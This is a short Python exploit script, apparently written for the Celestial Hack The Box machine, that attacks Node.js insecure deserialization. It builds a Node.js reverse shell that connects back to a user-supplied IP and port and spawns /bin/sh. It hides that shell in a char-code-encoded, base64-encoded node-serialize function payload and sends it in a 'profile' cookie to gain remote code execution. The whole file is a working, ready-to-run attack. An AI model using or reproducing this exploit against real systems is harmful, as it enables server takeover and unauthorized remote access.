#!/usr/bin/python
#Node JS deserialization RCE, reverse shell
#Based on Celestial (HTB)
import requests
import sys
import subprocess
import codecs

if len(sys.argv) < 3:
    print("(+) usage: %s <target> <your_ip> <your_port>" % sys.argv[0])  
    sys.exit(-1)
    
target = sys.argv[1]
IP_ADDR=sys.argv[2]
PORT=sys.argv[3]

def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print("[+] LHOST = %s" % (IP_ADDR))
print("[+] LPORT = %s" % (PORT))
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print("[+] Encoding")
PAYLOAD = charencode(NODEJS_REV_SHELL)
PAYLOAD = ("{\"rce\""+":""\""+"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(%s))" % (PAYLOAD)+"}()\"}")
#print(PAYLOAD)

cmd = "echo \'"+PAYLOAD+"\' | base64 -w0"
ps=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
bsendData = ps.communicate()[0]

SsendData=bsendData.decode("utf-8")
#print(SsendData)

s=requests.Session()
#proxies = { 'http': 'http://127.0.0.1:8080' }#use if needed for request capture
headers = {
    'Cookie':'profile='+SsendData
    }
r=s.get("http://%s/" % target, allow_redirects=False, headers=headers)
print("shell inc.")
